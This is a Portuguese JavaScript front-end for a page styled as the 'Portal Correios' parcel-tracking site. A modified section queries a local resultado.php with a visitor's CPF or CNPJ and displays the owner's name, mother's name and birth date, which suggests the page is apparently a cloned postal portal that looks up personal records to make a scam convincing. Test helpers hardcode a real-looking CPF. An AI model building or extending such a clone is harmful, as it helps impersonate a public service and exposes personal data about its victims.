/**
 * Index.js - Arquivo Principal Otimizado
 * Versão otimizada: removidos imports não utilizados, simplificado event handling
 * MODIFICADO: Adicionado sistema de consulta para CPF, CNPJ e código de rastreio
 */

import * as alerta from '../core/templates/bunker/js/alerta.js';
import * as forms from '../core/templates/bunker/js/forms.js';
import * as CodigoObjeto from '../core/js/rastroGeral.js';
import * as rastroUnico from '../core/js/rastroUnico.js';
import * as rastroMulti from '../core/js/rastroMulti.js';
import * as botoes from '../core/js/botoes.js';
import * as modal from '../core/templates/bunker/js/modal.js';

import { 
    DOM_IDS, 
    CSS_CLASSES, 
    SELECTORS, 
    ERROR_MESSAGES,
    ENDPOINTS 
} from './constants.js';

import { 
    trackingHeaderTemplate,
    breadcrumbTemplate,
    pageTitleTemplate,
    socialShareTemplate,
    formatTrackingCode,
    viewMoreTemplate
} from './templates.js';

import { 
    domCache,
    debounce,
    CodeValidator,
    DOMUtils,
    URLUtils
} from './utils.js';

import { 
    TrackingAPI,
    CaptchaAPI,
    apiManager
} from './api.js';

/**
 * Classe principal otimizada para gerenciar o sistema
 */
class TrackingSystem {
    constructor() {
        this.isInitialized = false;
        this.setupEventListeners();
        this.initializeValidation();
    }

    setupEventListeners() {
        const searchButton = domCache.get(`#${DOM_IDS.SEARCH_BUTTON}`);
        const trackingInput = domCache.get(`#${DOM_IDS.TRACKING_INPUT}`);
        const refreshButton = domCache.get(`#${DOM_IDS.REFRESH_BUTTON}`);
        const invokeButton = domCache.get(`#${DOM_IDS.INVOKE_BUTTON}`);

        searchButton?.addEventListener('click', () => this.handleSearch());
        
        window.addEventListener('keydown', (event) => {
            if (event.keyCode === 13) {
                this.handleSearch();
                return false;
            }
        });

        trackingInput?.addEventListener('input', 
            debounce(() => this.validateTrackingField(), 300)
        );

        refreshButton?.addEventListener('click', () => this.refreshCaptcha());
        invokeButton?.addEventListener('click', () => this.handleController());
    }

    initializeValidation() {
        this.isInitialized = true;
    }

    async validateTrackingField() {
        const input = domCache.get(`#${DOM_IDS.TRACKING_INPUT}`);
        if (!input) return;

        const cleanedInput = CodeValidator.cleanInput(input.value);
        
        if (!cleanedInput) {
            forms.setValidade(input, '');
            return;
        }

        if (this.shouldValidateLength(cleanedInput.length)) {
            const validation = CodeValidator.validateTrackingInput(cleanedInput);
            forms.setValidade(input, validation.error ? validation.message : '');
        }
    }

    shouldValidateLength(length) {
        return length === 11 || length === 14 || length === 13 || length === 12 || length % 13 === 0;
    }

    validateCaptchaField() {
		const input = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`);
		if (!input) return false;

		const captcha = input.value.trim();
		
		if (!captcha) {
			forms.setValidade(input, ERROR_MESSAGES.FILL_CAPTCHA);
			return false;
		}

		return true;
	}

    async handleSearch() {
		const trackingInput = domCache.get(`#${DOM_IDS.TRACKING_INPUT}`);
		const captchaInput = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`);
		
		if (!trackingInput || !captchaInput) return;

		// Pegar valor limpo (remover tudo exceto letras e números)
		const valorOriginal = trackingInput.value;
		const valorLimpo = valorOriginal.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
		
		if (!valorLimpo) {
			forms.setValidade(trackingInput, 'Por favor, digite um código de rastreio, CPF ou CNPJ');
			return;
		}

		// Determinar tipo de entrada
		const tipoEntrada = this.determinarTipoEntrada(valorLimpo);
		
		if (!tipoEntrada) {
			forms.setValidade(trackingInput, 'Código de objeto, CPF ou CNPJ informado não está válido');
			return;
		}

		// Validar captcha - APENAS VERIFICAR SE ESTÁ VAZIO
		const captcha = captchaInput.value.trim();
		if (!captcha) {
			forms.setValidade(captchaInput, ERROR_MESSAGES.FILL_CAPTCHA);
			return;
		}

		// Limpar possíveis erros anteriores do captcha
		forms.setValidade(captchaInput, '');
		forms.setValidade(trackingInput, '');

		// Processar usando resultado.php
		try {
			alerta.abre('Consultando...');
			
			const dados = await this.consultarResultado(valorLimpo);
			
			alerta.fecha();
			
			// Processar baseado no tipo retornado
			switch (dados.tipo) {
				case 'cpf':
					this.processarDadosCPF(dados, valorLimpo);
					break;
				case 'cnpj':
					this.processarDadosCNPJ(dados, valorLimpo);
					break;
				case 'rastreio':
					this.processarDadosRastreio(dados, valorLimpo);
					break;
				default:
					// Fallback para código de rastreio sem consulta
					this.processarCodigoRastreio(valorLimpo);
					break;
			}
			
			// Ações finais sempre executadas
			this.finalizarConsulta();
			
		} catch (error) {
			alerta.fecha();
			this.handleSearchError(error); // ← USAR O MÉTODO ATUALIZADO
			this.refreshCaptcha();
		}
	}

    processarDadosCPF(dados, cpf) {
        // Salvar dados em variáveis globais
        window.dadosUsuario = {
            nome: dados.nome,
            mae: dados.mae,
            nascimento: dados.nascimento,
            cpf: dados.cpf,
            sexo: dados.sexo
        };
        
        // Atualizar trilha
        this.atualizarTrilha(cpf);
        
        // Atualizar título com nome
        this.atualizarTitulo(`Olá, ${dados.nome}`);
    }

    processarDadosCNPJ(dados, cnpj) {
        // Salvar dados em variáveis globais
        window.dadosEmpresa = {
            nome: dados.nome,
            fantasia: dados.fantasia,
            cnpj: dados.cnpj,
            situacao: dados.situacao,
            atividade_principal: dados.atividade_principal,
            endereco: {
                logradouro: dados.logradouro,
                numero: dados.numero,
                municipio: dados.municipio,
                uf: dados.uf,
                cep: dados.cep
            },
            contato: {
                telefone: dados.telefone,
                email: dados.email
            }
        };
        
        // Atualizar trilha
        this.atualizarTrilha(cnpj);
        
        // Atualizar título no formato: Olá, fantasia / nome
        let titulo = 'Olá, ';
        if (dados.fantasia && dados.fantasia.trim()) {
            titulo += `${dados.fantasia}`;
        } else {
            titulo += dados.nome;
        }
        this.atualizarTitulo(titulo);
    }

    processarDadosRastreio(dados, codigo) {
        // Atualizar trilha
        this.atualizarTrilha(codigo);
        
        // Formatar código e atualizar título
        const codigoFormatado = this.formatarCodigoRastreio(codigo);
        this.atualizarTitulo(codigoFormatado);
        
        // Aqui você pode processar os dados de rastreio se necessário
    }

    async routeSearchByType(validation) {
        const captcha = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`).value;

        try {
            switch (validation.type) {
                case 'TRACKING_SINGLE':
                    await this.handleSingleTracking(validation.cleanedInput, captcha);
                    break;
                    
                case 'CPF':
                case 'CNPJ':
                case 'CPF_ALTERNATIVE':
                    this.handleDocumentRedirect(validation.cleanedInput, captcha);
                    break;
                    
                case 'TRACKING_MULTIPLE':
                    await this.handleMultipleTracking(validation.cleanedInput, captcha);
                    break;
                    
                default:
                    throw new Error(ERROR_MESSAGES.INVALID_CODE);
            }
        } catch (error) {
            this.handleSearchError(error);
        } finally {
            this.refreshCaptcha();
        }
    }

    async handleSingleTracking(codigo, captcha) {
        alerta.abre('Buscando...');
        
        try {
            this.clearTrackingResults();
            const data = await TrackingAPI.searchSingle(codigo, captcha, 'S');
            
            await this.renderSingleResult(data);
            this.setupShareButtons();
            
        } catch (error) {
            throw error;
        }
    }

    async handleMultipleTracking(codigos, captcha) {
        alerta.abre('Buscando...');
        
        try {
            const data = await TrackingAPI.searchMultiple(codigos, captcha);
            
            this.renderMultipleResults(data);
            this.setupTrackingDetailsEvents();
            this.setupShareButtons();
            
            alerta.fecha();
            
        } catch (error) {
            throw error;
        }
    }

    handleDocumentRedirect(documento, captcha) {
        const url = URLUtils.buildURL(ENDPOINTS.LOGIN, {
            objetos: documento,
            captcha: captcha
        });
        URLUtils.redirect(url);
    }

    async renderSingleResult(data) {
        const codigo = data.codObjeto;
        
        domCache.get(`#${DOM_IDS.TRACKING_INPUT}`).value = '';
        
        const trackingContent = this.generateSingleTrackingContent(data);
        const buttons = this.generateTrackingButtons(data);
        
        const tabsElement = domCache.get(`#${DOM_IDS.TRACKING_TABS}`);
        DOMUtils.setHTML(tabsElement, trackingContent.html + buttons.internacional + buttons.nacional);
        
        this.setupSingleTrackingEvents(data, trackingContent);
        this.updatePageForSingleResult(codigo);
        
        alerta.fecha();
    }

    generateSingleTrackingContent(data) {
        const header = trackingHeaderTemplate(data);
        const trackingList = rastroUnico.ul(data);
        const verMaisContent = rastroUnico.verMais(data);
        
        return viewMoreTemplate(data, verMaisContent, trackingList, true);
    }

    generateTrackingButtons(data) {
        return {
            internacional: botoes.btnsIntRastroUnico(data),
            nacional: botoes.btnsNacRastroUnico(data)
        };
    }

    setupSingleTrackingEvents(data, content) {
        if (content.hasViewMore) {
            const viewMoreButton = domCache.get('#a-ver-mais');
            viewMoreButton?.addEventListener('click', this.toggleViewMore);
        }
        
        const lockerButtons = domCache.getAll(SELECTORS.LOCKER_BUTTONS);
        this.setupLockerEvents(data.codObjeto, lockerButtons);
        
        const printButton = domCache.get(`#${DOM_IDS.PRINT_BUTTON}`);
        printButton?.addEventListener('click', () => this.handlePrint());
    }

    updatePageForSingleResult(codigo) {
        const breadcrumb = domCache.get(`#${DOM_IDS.BREADCRUMB}`);
        DOMUtils.setHTML(breadcrumb, breadcrumbTemplate(
            'Portal Correios',
            'Rastreamento', 
            codigo
        ));
        
        const pageTitle = domCache.get(`#${DOM_IDS.PAGE_TITLE}`);
        DOMUtils.setHTML(pageTitle, pageTitleTemplate(
            formatTrackingCode(codigo),
            true
        ));
    }

    renderMultipleResults(data) {
        domCache.get(`#${DOM_IDS.TRACKING_INPUT}`).value = '';
        
        this.updatePageForMultipleResults();
        
        const tabsElement = domCache.get(`#${DOM_IDS.TRACKING_TABS}`);
        DOMUtils.setHTML(tabsElement, rastroMulti.render(data, 'tabs2'));
        
        this.setupMultipleTrackingTabs();
    }

    updatePageForMultipleResults() {
        const breadcrumb = domCache.get(`#${DOM_IDS.BREADCRUMB}`);
        DOMUtils.setHTML(breadcrumb, breadcrumbTemplate(
            'Portal Correios',
            'Rastreamento'
        ));
        
        const pageTitle = domCache.get(`#${DOM_IDS.PAGE_TITLE}`);
        DOMUtils.setHTML(pageTitle, pageTitleTemplate('Rastreamento', true));
    }

    setupMultipleTrackingTabs() {
        $('#multirastro-tab a').on('click', function(e) {
            e.preventDefault();
            const transitElement = document.getElementById('em-transito');
            const deliveredElement = document.getElementById('entregue');
            
            if (transitElement && deliveredElement) {
                $(this).tab('show');
            }
        });
    }

    setupTrackingDetailsEvents() {
        const links = domCache.getAll(SELECTORS.TRACKING_LINKS);
        links.forEach(link => {
            link.addEventListener('click', (event) => this.handleTrackingDetails(event));
        });
    }

    async handleTrackingDetails(event) {
        event.preventDefault();
        
        const codObjeto = event.currentTarget.dataset.codobjeto;
        const container = document.getElementById(codObjeto);
        
        if (!container) return;
        
        const icon = container.querySelector("a>i");
        const detailsDiv = container.querySelector('div[data-name="rastrosUnicos"]');
        const buttonDivs = container.querySelectorAll('div[data-name="barra-botoes"]');
        
        if (DOMUtils.hasClass(icon, "fa-plus-circle")) {
            this.closeAllTrackingDetails();
            icon.classList.replace("fa-plus-circle", "fa-minus-circle");
        } else {
            this.toggleTrackingDetails(detailsDiv, buttonDivs, icon);
            return;
        }
        
        if (!detailsDiv.innerHTML.trim()) {
            await this.loadTrackingDetails(codObjeto, detailsDiv, buttonDivs, icon);
        }
        
        this.showTrackingDetails(detailsDiv, buttonDivs);
    }

    async loadTrackingDetails(codObjeto, detailsDiv, buttonDivs, icon) {
        if (!this.validateCaptchaField()) {
            icon.classList.replace("fa-minus-circle", "fa-plus-circle");
            return;
        }
        
        alerta.abre('Buscando...');
        
        try {
            const captcha = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`).value;
            const data = await TrackingAPI.searchSingle(codObjeto, captcha, 'N');
            
            const header = trackingHeaderTemplate(data);
            const trackingList = rastroUnico.ul(data, 'T');
            DOMUtils.setHTML(detailsDiv, header + trackingList);
            
            const buttons = botoes.btnsNacRastroUnico(data);
            buttonDivs.forEach(div => {
                div.innerHTML += buttons;
            });
            
            const lockerButtons = container.querySelectorAll(SELECTORS.LOCKER_BUTTONS);
            this.setupLockerEvents(codObjeto, lockerButtons);
            
        } catch (error) {
            icon.classList.replace("fa-minus-circle", "fa-plus-circle");
            this.handleSearchError(error);
        } finally {
            alerta.fecha();
        }
    }

    showTrackingDetails(detailsDiv, buttonDivs) {
        DOMUtils.removeClass(detailsDiv, CSS_CLASSES.HIDDEN);
        
        buttonDivs.forEach(div => {
            if (div.innerHTML.trim()) {
                DOMUtils.removeClass(div, CSS_CLASSES.HIDDEN);
            }
        });
    }

    toggleTrackingDetails(detailsDiv, buttonDivs, icon) {
        DOMUtils.toggleClass(detailsDiv, CSS_CLASSES.HIDDEN);
        
        const allButtons = domCache.getAll(SELECTORS.TRACKING_BUTTONS);
        allButtons.forEach(el => DOMUtils.addClass(el, CSS_CLASSES.HIDDEN));
        
        icon.classList.replace("fa-minus-circle", "fa-plus-circle");
    }

    closeAllTrackingDetails() {
        const allButtons = domCache.getAll(SELECTORS.TRACKING_BUTTONS);
        const allDetails = domCache.getAll(SELECTORS.TRACKING_DETAILS);
        const allIcons = domCache.getAll(SELECTORS.OBJECT_INFO_ICONS);
        
        allButtons.forEach(el => DOMUtils.addClass(el, CSS_CLASSES.HIDDEN));
        allDetails.forEach(el => DOMUtils.addClass(el, CSS_CLASSES.HIDDEN));
        allIcons.forEach(el => {
            el.classList.replace("fa-minus-circle", "fa-plus-circle");
        });
    }

    setupShareButtons() {
        const shareButtons = domCache.getAll(SELECTORS.SHARE_BUTTONS);
        shareButtons.forEach(button => {
            button.addEventListener('click', (event) => this.handleShare(event));
        });
    }

    handleShare(event) {
        const destinyDiv = document.getElementById("msharebuttons");
        const loadedCode = destinyDiv.dataset.codigo;
        const section = destinyDiv.closest('section');
        const link = event.target;
        const code = link.closest('a').dataset.objeto;
        
        if (code !== loadedCode) {
            const socialContent = socialShareTemplate(code);
            DOMUtils.setHTML(destinyDiv, socialContent);
            destinyDiv.dataset.codigo = code;
        }
        
        modal.abre('modalshare');
        this.positionShareModal(link, section, destinyDiv);
    }

    positionShareModal(link, section, destinyDiv) {
        const buttonOffset = link.getBoundingClientRect();
        const sectionOffset = section.getBoundingClientRect();
        const windowWidth = window.innerWidth;
        const horizontalPosition = sectionOffset.left + sectionOffset.width;
        
        section.style.position = "absolute";
        section.style.left = buttonOffset.left + (buttonOffset.width - sectionOffset.width) / 2 + 'px';
        section.style.top = buttonOffset.top + buttonOffset.height + 11 + 'px';
        
        DOMUtils.removeClass(destinyDiv, 'vertical');
        
        if (horizontalPosition > windowWidth) {
            DOMUtils.addClass(destinyDiv, 'vertical');
        }
    }

    setupLockerEvents(codigo, buttons) {
        if (buttons.length) {
            buttons.forEach(button => {
                button.addEventListener('click', () => this.showLockerQR(codigo));
            });
        }
    }

    async showLockerQR(codigo) {
        try {
            const modal1 = document.getElementById('m1');
            
            if (!modal1.innerHTML.length || modal1.dataset.objeto !== codigo) {
                const data = await TrackingAPI.getLockerQR(codigo);
                
                let iframe = document.getElementById('ifLocker');
                if (!modal1.getElementsByTagName('iframe').length) {
                    iframe = document.createElement('iframe');
                    iframe.className = 'lckrIframe';
                    iframe.id = 'ifLocker';
                }
                
                iframe.src = data.shortLinkQRCode;
                modal1.appendChild(iframe);
                modal1.dataset.objeto = codigo;
            }
            
            modal.abre('m1');
            
        } catch (error) {
            alerta.abre(error.message, 10, 'OK');
        }
    }

    toggleViewMore() {
        const viewMore = document.querySelector('#ver-mais');
        const viewFull = document.querySelector('#ver-rastro-unico');
        
        if (viewMore && viewFull) {
            viewMore.style.display = "none";
            viewFull.style.display = "block";
        }
    }

    handlePrint() {
        const viewMore = document.querySelectorAll('#ver-mais');
        if (viewMore.length) {
            this.toggleViewMore();
        }
        window.print();
    }

    refreshCaptcha() {
        if (typeof window.captcha_image_audioObj !== 'undefined') {
            window.captcha_image_audioObj.refresh();
        }
        
        const captchaImage = domCache.get(`#${DOM_IDS.CAPTCHA_IMAGE}`);
        const captchaInput = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`);
        
        if (captchaInput) captchaInput.value = '';
        if (captchaImage) {
            captchaImage.src = CaptchaAPI.refreshImage();
            captchaImage.blur();
        }
    }

    async handleController() {
        try {
            const data = await TrackingAPI.getControlData();
            
            if (data.form_retorno === 'rastreamento') {
                if (data.listaObjetos?.length) {
                    const objInput = domCache.get(`#${DOM_IDS.TRACKING_INPUT}`);
                    if (objInput) objInput.value = data.listaObjetos;
                }
            } else if (data.logado) {
                await this.handleDocumentSearch();
            }
            
        } catch (error) {
            alerta.abre(error.message, 10, 'OK');
        }
    }

    async handleDocumentSearch() {
        console.log('Busca por documento - funcionalidade mantida');
    }

    clearTrackingResults() {
        const tabsElement = domCache.get(`#${DOM_IDS.TRACKING_TABS}`);
        DOMUtils.setHTML(tabsElement, '');
    }

    handleSearchError(error) {
		if (error.message === ERROR_MESSAGES.INVALID_CAPTCHA) {
			const captchaInput = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`);
			forms.setValidade(captchaInput, ERROR_MESSAGES.INVALID_CAPTCHA);
			// Não fechar o alerta aqui, será fechado automaticamente
		} else {
			alerta.abre(error.message, 10, 'OK');
		}
	}

    // === NOVOS MÉTODOS PARA SISTEMA DE CONSULTA ===
    
    determinarTipoEntrada(valor) {
        const PATTERNS = {
            CPF: /^[0-9]{11}$/,
            CNPJ: /^[0-9]{14}$/,
            CODIGO_RASTREIO: /^[A-Z]{2}[0-9]{9}[A-Z]{2}$/
        };

        if (PATTERNS.CPF.test(valor)) {
            return 'CPF';
        }
        if (PATTERNS.CNPJ.test(valor)) {
            return 'CNPJ';
        }
        if (PATTERNS.CODIGO_RASTREIO.test(valor)) {
            return 'CODIGO_RASTREIO';
        }
        return null;
    }

    async processarCodigoRastreio(codigo) {
        // Atualizar trilha
        this.atualizarTrilha(codigo);
        
        // Formatar código e atualizar título
        const codigoFormatado = this.formatarCodigoRastreio(codigo);
        this.atualizarTitulo(codigoFormatado);
    }

    async processarCPF(cpf) {
        try {
            alerta.abre('Consultando CPF...');
            
            // Fazer consulta na API
            const dadosCPF = await this.consultarAPICPF(cpf);
            
            // Salvar dados em variáveis globais
            window.dadosUsuario = {
                nome: dadosCPF.nome,
                mae: dadosCPF.mae,
                nascimento: dadosCPF.nascimento,
                cpf: dadosCPF.cpf
            };
            
            // Atualizar trilha
            this.atualizarTrilha(cpf);
            
            // Atualizar título com nome
            this.atualizarTitulo(`Olá, ${dadosCPF.nome}`);
            
            alerta.fecha();
            
        } catch (error) {
            alerta.fecha();
            throw new Error('Erro ao consultar CPF: ' + error.message);
        }
    }

    async processarCNPJ(cnpj) {
        try {
            alerta.abre('Consultando CNPJ...');
            
            // Fazer consulta na API
            const dadosCNPJ = await this.consultarAPICNPJ(cnpj);
            
            // Salvar dados em variáveis globais
            window.dadosEmpresa = {
                nome: dadosCNPJ.nome,
                fantasia: dadosCNPJ.fantasia,
                cnpj: dadosCNPJ.cnpj
            };
            
            // Atualizar trilha
            this.atualizarTrilha(cnpj);
            
            // Atualizar título com nome fantasia
            const nomeExibicao = dadosCNPJ.fantasia && dadosCNPJ.fantasia.trim() 
                ? dadosCNPJ.fantasia 
                : dadosCNPJ.nome;
            this.atualizarTitulo(`Olá, ${nomeExibicao}`);
            
            alerta.fecha();
            
        } catch (error) {
            alerta.fecha();
            throw new Error('Erro ao consultar CNPJ: ' + error.message);
        }
    }

    async consultarResultado(objeto) {
        const captcha = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`).value;
        const url = `resultado.php?objeto=${objeto}&captcha=${captcha}`;
        
        try {
            const response = await fetch(url);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            const data = await response.json();
            
            if (data.erro) {
                throw new Error(data.mensagem || 'Erro na consulta');
            }
            
            return data;
            
        } catch (error) {
            if (error.message.includes('fetch')) {
                throw new Error('Erro de conexão. Verifique sua internet.');
            }
            throw error;
        }
    }

    atualizarTrilha(codigo) {
        const trilha = domCache.get(`#${DOM_IDS.BREADCRUMB}`);
        
        if (!trilha) return;
        
        const links = trilha.querySelectorAll('a');
        
        // Se tem mais de 2 links, remove o último
        if (links.length > 2) {
            const ultimoLink = links[links.length - 1];
            ultimoLink.remove();
        }
        
        // Adiciona novo link com formatação se for CPF
        const novoLink = document.createElement('a');
        novoLink.textContent = this.formatarParaTrilha(codigo);
        trilha.appendChild(novoLink);
    }

    formatarParaTrilha(codigo) {
        // Se for CPF (11 dígitos), formatar como 000.000.000-00
        if (/^[0-9]{11}$/.test(codigo)) {
            return `${codigo.substring(0, 3)}.${codigo.substring(3, 6)}.${codigo.substring(6, 9)}-${codigo.substring(9, 11)}`;
        }
        // Se for CNPJ (14 dígitos), formatar como 00.000.000/0000-00
        if (/^[0-9]{14}$/.test(codigo)) {
            return `${codigo.substring(0, 2)}.${codigo.substring(2, 5)}.${codigo.substring(5, 8)}/${codigo.substring(8, 12)}-${codigo.substring(12, 14)}`;
        }
        // Senão, retorna como está
        return codigo;
    }

    atualizarTitulo(texto) {
        const tituloH3 = domCache.get('#titulo-pagina h3');
        
        if (tituloH3) {
            tituloH3.textContent = texto;
        }
    }

    formatarCodigoRastreio(codigo) {
        // Formato: ND 575 882 651 BR
        if (codigo.length !== 13) return codigo;
        
        return `${codigo.substring(0, 2)} ${codigo.substring(2, 5)} ${codigo.substring(5, 8)} ${codigo.substring(8, 11)} ${codigo.substring(11, 13)}`;
    }

    finalizarConsulta() {
        // Remover classe "oculto" do tabs-rastreamento
        const tabsRastreamento = domCache.get(`#${DOM_IDS.TRACKING_TABS}`);
        if (tabsRastreamento) {
            DOMUtils.removeClass(tabsRastreamento, 'oculto');
        }
        
        // Limpar conteúdo do jumbotron
        const jumbotron = domCache.get('.jumbotron');
        if (jumbotron) {
            DOMUtils.setHTML(jumbotron, '<!-- Conteúdo será adicionado aqui conforme sua especificação -->');
        }
    }

    destroy() {
        apiManager.cancelAllRequests();
        domCache.clear();
    }
}

// Inicialização otimizada
document.addEventListener('DOMContentLoaded', () => {
    window.trackingSystem = new TrackingSystem();
    
    // === FUNÇÕES DE TESTE PARA DEBUG ===
    window.testarConsulta = {
        cpf: () => {
            const input = document.getElementById('objeto');
            if (input) {
                input.value = '07340908897';
                window.trackingSystem.handleSearch();
            }
        },
        codigo: () => {
            const input = document.getElementById('objeto');
            if (input) {
                input.value = 'ND575882651BR';
                window.trackingSystem.handleSearch();
            }
        },
        cnpj: () => {
            const input = document.getElementById('objeto');
            if (input) {
                input.value = '12345678901234';
                window.trackingSystem.handleSearch();
            }
        }
    };
});

window.addEventListener('beforeunload', () => {
    if (window.trackingSystem) {
        window.trackingSystem.destroy();
    }
});